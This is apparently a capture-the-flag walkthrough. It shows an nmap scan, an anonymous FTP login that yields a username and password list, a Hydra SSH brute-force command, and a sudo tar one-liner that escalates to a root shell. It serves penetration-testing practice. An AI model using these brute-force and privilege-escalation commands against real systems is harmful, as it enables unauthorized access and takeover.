# Enumeration:-

Lets run quick nmap scan.

```bash

sudo nmap <ip>

```

This returned 3 open ports.

port      |service

----------|----------

21        |FTP

22        |SSH

80        |Web server

Let's enumerate ftp port first.

Connect to it. Type,

```bash

ftp <ip>

```

Login using anonymous name.

Now, let's view files using ls command.

There are two files named as locks.txt and task.txt.

Get them to your pc and see whats inside.

First one has a username and other has list of words which is a password list for bruteforcing.

# Gaining access:-

Since we have username and password list, let's do a bruteforcing attack using Hydra.

Hydra is a tool we are going to use to do bruteforcing.

Type:-

```bash

hydra -l <username> -P <password_list> -t 1 <ip> ssh

```

Now, we know the password.

Let's login over ssh.

Type:-

```bash

ssh <username>@<ip>

```

And enter the password you got.

# Privilege Escaltion:-

Type sudo -l and see that we can run tar app as a root.

Let's go to gtfobins and get the sudo exploit for tar.

If you can't find it, here type:-

```bash

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

```

Once you execute above command, you'll become a root user.

Congrats, now get the flags.
